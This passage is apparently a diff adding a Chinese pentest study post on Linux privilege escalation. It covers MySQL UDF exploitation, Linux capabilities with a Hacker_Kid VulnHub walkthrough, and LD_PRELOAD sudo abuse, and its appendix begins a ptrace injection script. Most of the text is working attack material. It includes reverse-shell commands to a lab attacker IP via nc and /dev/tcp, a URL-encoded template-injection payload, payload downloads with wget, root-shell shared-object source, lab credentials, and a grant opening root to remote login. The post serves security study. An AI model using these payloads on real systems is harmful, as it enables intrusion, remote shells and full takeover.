+</span></span></code></pre></div><p>python poc.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031160606.png&#34; alt=&#34;Pasted image 20251031160606.png&#34;&gt;&lt;/p&gt;
+</span></span><span style="display:flex;"><span>翻到数据库账号密码
+</span></span><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031160759.png&#34; alt=&#34;Pasted image 20251031160759.png&#34;&gt;&lt;/p&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>## MYSQL-UDF提权(手工)：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>先起一个交互终端
+</span></span></code></pre></div><p>python -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;
+php -r &lsquo;$proc=proc_open(&quot;/bin/bash&quot;,[0=&gt;STDIN,1=&gt;STDOUT,2=&gt;STDERR],$pipes);proc_close($proc);&rsquo;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>已经编译好的so文件目录
+</span></span></code></pre></div><p>/usr/share/metasploit-framework/data/exploits/mysql
+/usr/share/sqlmap/data/udf/mysql</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>自行编译UDF.so.先确定架构
+</span></span></code></pre></div><p>show variables like &lsquo;%compile%&rsquo;;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031165451.png&#34; alt=&#34;Pasted image 20251031165451.png&#34;&gt;&lt;/p&gt;
+</span></span></code></pre></div><p>searchsploit udf</p>
+<p>cp /usr/share/exploitdb/exploits/linux/local/1518.c .</p>
+<p>gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc</p>
+<h1 id="编译64位版本的udf">编译64位版本的UDF</h1>
+<p>gcc -shared -fPIC -m64 -o udf2.so 1518.c</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>简单web
+</span></span></code></pre></div><p>python -m http.server 8888</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031161646.png&#34; alt=&#34;Pasted image 20251031161646.png&#34;&gt;&lt;/p&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- 下载到目标上
+</span></span></code></pre></div><p>cd tmp
+wget http://192.168.88.145:8888/utf.so</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;/static/Pasted image 20251031162016.png&#34; alt=&#34;Pasted image 20251031162016.png&#34;&gt;&lt;/p&gt;
+</span></span><span style="display:flex;"><span>- 连接进行导出调用
+</span></span><span style="display:flex;"><span>```shell
+</span></span><span style="display:flex;"><span>mysql -uroot -pR@v3nSecurity
+</span></span></code></pre></div><h2 id="确认能否执行udf">确认能否执行udf</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#66d9ef">version</span>(); <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">查看</span>mysql<span style="color:#960050;background-color:#1e0010">版本</span>
+</span></span></code></pre></div><p>5.5.60-0+deb8u1默认不启用secure_file_priv</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SHOW</span> VARIABLES <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;secure_file_priv&#39;</span>;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">@@</span>basedir; <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">确认</span>mysql<span style="color:#960050;background-color:#1e0010">安装位置</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">show</span> variables <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%basedir%&#39;</span>; <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">确认</span>mysql<span style="color:#960050;background-color:#1e0010">安装位置</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">show</span> variables <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%secure%&#39;</span>; <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">查看可导出文件位置</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">show</span> variables <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%plugin%&#39;</span>; <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">查找插件位置</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">show</span> variables <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;%compile%&#39;</span>; <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">查看系统版本</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>use mysql;
+</span></span></code></pre></div><h3 id="创建xiaodi表">创建xiaodi表</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>create table hzhsec(line blob);
+</span></span></code></pre></div><h3 id="往hzhsec表中插入二进制的udfso">往hzhsec表中插入二进制的udf.so</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>insert into hzhsec values(load_file(&#39;/tmp/udf.so&#39;));
+</span></span></code></pre></div><h3 id="导出udfso">导出udf.so</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>select * from hzhsec into dumpfile &#39;/usr/lib/mysql/plugin/udf4.so&#39;;
+</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251031165350.png" alt="Pasted image 20251031165350.png"></p>
+<h3 id="创建do_system自定义函数">创建do_system自定义函数</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>create function do_system returns integer soname &#39;udf3.so&#39;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>select do_system(&#39;nc 192.168.88.145 5555 -e /bin/bash&#39;);
+</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251031165633.png" alt="Pasted image 20251031165633.png"></p>
+<h2 id="工具梭哈">工具梭哈</h2>
+<p>查看root是否支持远程登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>SELECT user, host FROM mysql.user WHERE user = &#39;root&#39;;
+</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251031165936.png" alt="Pasted image 20251031165936.png"></p>
+很明显不支持
+<h3 id="开启远程登录">开启远程登录</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;v3nSecurity&#39; WITH GRANT OPTION;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flush privileges;
+</span></span></code></pre></div><p>由于没有开放3306端口,这个利用不了</p>
+<hr>
+<h1 id="capability能力">Capability能力</h1>
+<p>Capability能力,简单来说就是一个方便的权限管理的机制</p>
+<p>原理参考：
+<a href="https://www.cnblogs.com/f-carey/p/16026088.html">https://www.cnblogs.com/f-carey/p/16026088.html</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cp /usr/bin/php /tmp/php
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>设置能力：setcap cap_setuid+ep /tmp/php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>删除能力：setcap -r /tmp/php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>查看单个能力：getcap /usr/bin/php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>查看所有能力：getcap -r / 2&gt;/dev/null
+</span></span></code></pre></div><p><strong>Hacker_Kid靶场</strong></p>
+<p>WP参考：
+<a href="https://www.jianshu.com/p/60673ac0454f">https://www.jianshu.com/p/60673ac0454f</a></p>
+<p>环境：
+<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">https://www.vulnhub.com/entry/hacker-kid-101,719/</a></p>
+<h2 id="权限获取">权限获取</h2>
+<p>端口扫描</p>
+<p align="center"><img src="/static/Pasted image 20251031184934.png" alt="Pasted image 20251031184934.png"></p>
+看到80端口开放,查看网页
+<p align="center"><img src="/static/Pasted image 20251031185030.png" alt="Pasted image 20251031185030.png"></p>
+为静态网页,观察前端源码提示,拼接get请求参数
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://192.168.88.153/?page_no=1
+</span></span></code></pre></div><p>到page=21时显示提示</p>
+<p align="center"><img src="/static/Pasted image 20251031185152.png" alt="Pasted image 20251031185152.png"></p>
+根据提示使用dig查看 192.168.88.153 hackers.blackhat.local其他的子域名
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>dig hackers.blackhat.local @192.168.88.153
+</span></span></code></pre></div><p>发现子域名 hackerkid.blackhat.local</p>
+<p>修改hosts文件
+windows :
+C:\Windows\System32\drivers\etc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>192.168.88.153 hackerkid.blackhat.local
+</span></span><span style="display:flex;"><span>192.168.88.153 hackers.blackhat.local
+</span></span></code></pre></div><p>访问hackers.blackhat.local,看到另一个网页</p>
+<p align="center"><img src="/static/Pasted image 20251031185550.png" alt="Pasted image 20251031185550.png"></p>
+拦截数据包
+发现存在xml输入,测试是否有XXE漏洞
+<p>email参数有回显</p>
+<p align="center"><img src="/static/Pasted image 20251031190649.png" alt="Pasted image 20251031190649.png"></p>
+注入xxepayload,成功回显
+<p align="center"><img src="/static/Pasted image 20251031190934.png" alt="Pasted image 20251031190934.png"></p>
+看出只有root和saket是可登录用户
+读取当前用户的文件
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/home/saket/.bashrc
+</span></span></code></pre></div><p>返回值被拦截了用伪协议</p>
+<p align="center"><img src="/static/Pasted image 20251031191402.png" alt="Pasted image 20251031191402.png"></p>
+解码获取账号密码
+<p align="center"><img src="/static/Pasted image 20251031191515.png" alt="Pasted image 20251031191515.png"></p>
+推测是用户saket的
+来到9999端口,有登录页面,成功登录用户saket
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>saket
+</span></span><span style="display:flex;"><span>Saket!#$%@!!
+</span></span></code></pre></div><p>name参数发现模板注入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://hackerkid.blackhat.local:9999/?name={{7*7}}
+</span></span></code></pre></div><p>由于是端口9999,推测（9999端口，Tornado）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{% import os %}{{os.system(&#39;bash -c &#34;bash -i &amp;&gt; /dev/tcp/192.168.88.145/6688 0&gt;&amp;1&#34;&#39;)}}
+</span></span></code></pre></div><p>反弹shell,要进行url编码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://hackerkid.blackhat.local:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system(&#39;bash%20-c%20%22bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2F192.168.88.145%2F6688%200%3E%261%22&#39;)%7D%7D
+</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251031201437.png" alt="Pasted image 20251031201437.png"></p>
+<h2 id="权限提升">权限提升</h2>
+<p>获取Capability能力的概况</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/sbin/getcap -r / 2&gt;/dev/null
+</span></span></code></pre></div><p>参考见附录</p>
+<p align="center"><img src="/static/Pasted image 20251031201840.png" alt="Pasted image 20251031201840.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/usr/bin/python2.7 = cap_sys_ptrace+ep
+</span></span></code></pre></div><p>python2.7拥有cap_sys_ptrace权限，意味着他可以调试别的进程，对进程进行内存修改及查看等活动，利用提权脚本：
+脚本inject.py见附录</p>
+<p>控制主机下载</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -m http.server 8080
+</span></span><span style="display:flex;"><span>wget http://192.168.88.145:8888/inject.py
+</span></span></code></pre></div><p>批量注入命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>for i in `ps -ef|grep root|grep -v &#34;grep&#34;|awk &#39;{print $2}&#39;`; do python2.7 inject.py $i; done
+</span></span></code></pre></div><p>查看是否成功</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>netstat -ano | grep 5600
+</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251031203235.png" alt="Pasted image 20251031203235.png"></p>
+远程连接
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>nc 192.168.88.153 5600
+</span></span></code></pre></div><p>结论：suid升级版，更细致的权限划分，通过能力有哪些权限设置进行利用</p>
+<p align="center"><img src="/static/Pasted image 20251031203443.png" alt="Pasted image 20251031203443.png"></p>
+<hr>
+<h1 id="ld_preload加载">LD_Preload加载</h1>
+<p>参考：
+<a href="https://www.cnblogs.com/backlion/p/10503985.html">https://www.cnblogs.com/backlion/p/10503985.html</a></p>
+<p>修改/etc/sudoers</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Defaults env_keep += LD_PRELOAD
+</span></span></code></pre></div><p>将用户hzhsec添加到sudo默认不用密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>hzhsec ALL=(ALL:ALL) NOPASSWD: /usr/bin/find
+</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251031204510.png" alt="Pasted image 20251031204510.png"></p>
+<p>目录中创建shell.c文件
+交互终端</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_init</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">unsetenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setgid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>编译它以生成一个带有.so扩展名的共享对象，同样在Windows操作系统中使用.dll文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+</span></span><span style="display:flex;"><span>ls -al shell.so
+</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251031204959.png" alt="Pasted image 20251031204959.png"></p>
+<p>获取root权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo LD_PRELOAD=/tmp/shell.so find
+</span></span><span style="display:flex;"><span>whoami
+</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251031205135.png" alt="Pasted image 20251031205135.png"></p>
+<p>注意,和sudo提权有区别
+当修改成无法通过sudo利用的文件时</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>hzhsec ALL=(ALL:ALL) NOPASSWD: /tmp/hzh.sh
+</span></span></code></pre></div><p>hzh.sh内容只有一个ls</p>
+<p align="center"><img src="/static/Pasted image 20251031205858.png" alt="Pasted image 20251031205858.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo LD_PRELOAD=/tmp/shell.so /tmp/hzh.sh
+</span></span></code></pre></div><p>同样执行成功</p>
+<p align="center"><img src="/static/Pasted image 20251031205939.png" alt="Pasted image 20251031205939.png"></p>
+**结论**：sudo提权有限制，但是一旦设置了LD_PRELOAD，那么只要有程序既可提权
+<hr>
+<h1 id="附录">附录</h1>
+<p>权限参考</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>CAP_CHOWN 0 允许改变文件的所有权
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_DAC_OVERRIDE 1 忽略对文件的所有DAC访问限制
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_DAC_READ_SEARCH 2 忽略所有对读、搜索操作的限制
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_FOWNER 3 以最后操作的UID,覆盖文件的先前的UID
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_FSETID 4 确保在文件被修改后不修改setuid/setgid位
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_KILL 5 允许对不属于自己的进程发送信号
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SETGID 6 允许改变组ID
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SETUID 7 允许改变用户ID
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SETPCAP 8 允许向其它进程转移能力以及删除其它进程的任意能力(只限init进程)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_LINUX_IMMUTABLE 9 允许修改文件的不可修改(IMMUTABLE)和只添加(APPEND-ONLY)属性
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_NET_BIND_SERVICE 10 允许绑定到小于1024的端口
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_NET_BROADCAST 11 允许网络广播和多播访问(未使用)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_NET_ADMIN 12 允许执行网络管理任务：接口、防火墙和路由等.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_NET_RAW 13 允许使用原始(raw)套接字
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_IPC_LOCK 14 允许锁定共享内存片段
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_IPC_OWNER 15 忽略IPC所有权检查
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_MODULE 16 插入和删除内核模块
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_RAWIO 17 允许对ioperm/iopl的访问
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_CHROOT 18 允许使用chroot()系统调用
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_PTRACE 19 允许跟踪任何进程
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_PACCT 20 允许配置进程记帐(process accounting)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_ADMIN 21 允许执行系统管理任务：加载/卸载文件系统、设置磁盘配额、开/关交换设备和文件等.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_BOOT 22 允许重新启动系统
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_NICE 23 允许提升优先级，设置其它进程的优先级
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_RESOURCE 24 忽略资源限制
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_TIME 25 允许改变系统时钟
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SYS_TTY_CONFIG 26 允许配置TTY设备
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_MKNOD 27 允许使用mknod()系统调用
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_LEASE 28 允许在文件上建立租借锁
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CAP_SETFCAP 31 允许在指定的程序上授权能力给其它程序
+</span></span></code></pre></div><p>inject.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> ctypes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Macros defined in &lt;sys/ptrace.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span>
+</span></span><span style="display:flex;"><span>PTRACE_POKETEXT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>PTRACE_GETREGS <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>PTRACE_SETREGS <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
+</span></span><span style="display:flex;"><span>PTRACE_ATTACH <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>PTRACE_DETACH <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Structure defined in &lt;sys/user.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">user_regs_struct</span>(ctypes<span style="color:#f92672">.</span>Structure):
+</span></span><span style="display:flex;"><span>    _fields_ <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;r15&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;r14&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;r13&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;r12&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;rbp&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;rbx&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;r11&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;r10&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;r9&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;r8&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;rax&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
